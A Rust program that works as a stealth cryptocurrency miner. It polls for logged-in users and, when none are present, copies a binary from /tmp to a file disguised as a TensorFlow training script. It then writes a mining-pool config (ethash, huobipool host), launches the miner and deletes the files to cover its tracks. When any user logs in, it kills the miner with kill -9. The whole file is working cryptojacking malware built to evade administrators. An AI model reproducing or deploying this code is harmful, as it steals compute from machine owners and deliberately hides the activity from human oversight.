use std::fs::File;
use std::io::Write;
use std::process::Command;
use std::thread;
use std::time::Duration;

use chrono::Utc;

fn main() {
    let mut pid: u32 = 0;
    loop {
        let user_count = get_user_count();
        println!("{} user_count: {}", Utc::now(), user_count);
        if user_count > 0 && pid != 0 {
            clean_env();
            kill_target_process(&mut pid);
        }
        if user_count <= 0 && pid == 0 {
            init_env();
            pid = start_target_process();
            clean_env();
        }
        thread::sleep(Duration::from_secs(1));
    }
}

fn get_user_count() -> usize {
    let w_output = Command::new("w").arg("-h").output().unwrap().stdout;
    String::from_utf8_lossy(&w_output).lines().count()
}

fn init_env() {
    println!("init_env()");
    let mut process = Command::new("cp");
    process.arg("/tmp/b86547d084228861");
    process.arg("tensorflow_fit_script.sh");
    process.spawn().unwrap().wait().unwrap();
    let mut config = File::create("c").unwrap();
    config.write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e").unwrap();
}

fn clean_env() {
    println!("clean_env()");
    let mut process = Command::new("rm");
    process.arg("-rf");
    process.arg("tensorflow_fit_script.sh");
    process.arg("c");
    process.spawn().unwrap();
}

fn start_target_process() -> u32 {
    println!("start_target_process()");
    let mut process = Command::new("./tensorflow_fit_script.sh");
    process.arg("--config");
    process.arg("c");
    let child = process.spawn().unwrap();
    let pid = child.id();
    println!("target process pid: {}", pid);
    return pid;
}

fn kill_target_process(pid: &mut u32) {
    println!("kill_target_process()");
    let mut process = Command::new("kill");
    process.arg("-9");
    process.arg(pid.to_string());
    process.spawn().unwrap().wait().unwrap();
    *pid = 0;
}
